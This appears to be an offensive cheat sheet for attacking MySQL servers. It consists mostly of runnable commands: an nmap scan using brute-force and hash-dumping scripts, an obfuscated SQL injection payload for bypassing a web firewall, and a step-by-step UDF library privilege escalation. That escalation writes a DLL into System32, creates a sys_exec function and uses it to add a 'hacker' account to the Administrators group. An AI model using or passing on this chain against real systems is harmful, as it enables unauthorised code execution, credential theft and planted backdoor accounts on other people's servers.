# see: https://blog.thehackingnomad.com/cheat-sheet-series/netwerkenum#3306-mysql

# - Try default credentials `root`:``
# - Check version for exploits
# - can read/write from disk w/ `INFILE` `OUTFILE` keywords

# nmap
nmap -sV -Pn --script=mysql-audit.nse,mysql-brute.nse,mysql-databases.nse,mysql-dump-hashes.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-query.nse,mysql-users.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse -p 3306 -o 3306_nmap_mysql $ip




# all-in-1 sqli test via url, bypassing waf
if/*!90000*/((3*9)>(0),sLeEp/*!80000*/(10),0)/*

# NOTICE: you can upload .dll/.so files and have them loaded by mysql w/o restart
# just put the lib (can find some precompiled on github)
#   ie. https://github.com/mysqludf/lib_mysqludf_sys
#   ie. raptor_udf2.so
# you can read all the details in exploit-db 1518
# compile from source
gcc -g -c raptor_udf2.c -fPIC
# make a temporary table to hold the file in memory
use mysql;
create table temp1(data blob);
# load it from the disk (presumably a temp folder low-leve user can write to)
insert into temp1 values(load_file('C:/Windows/Temp/lib_mysqludf_sys.dll'));
# move the file from memory to a protected admin dir in lib load path
select * from temp1 into dumpfile 'C:/Windows/System32/lib_mysqludf_sys_32.dll';
# or `/usr/lib/` on linux
# create procedure mapped to lib
create function sys_exec returns integer soname 'lib_mysqludf_sys_32.dll';
# use lib method to execute shell (RCE) ie. to add new admin account
select sys_exec("net user hacker pass /add");
select sys_exec("net localgroup Administrators hacker /add");

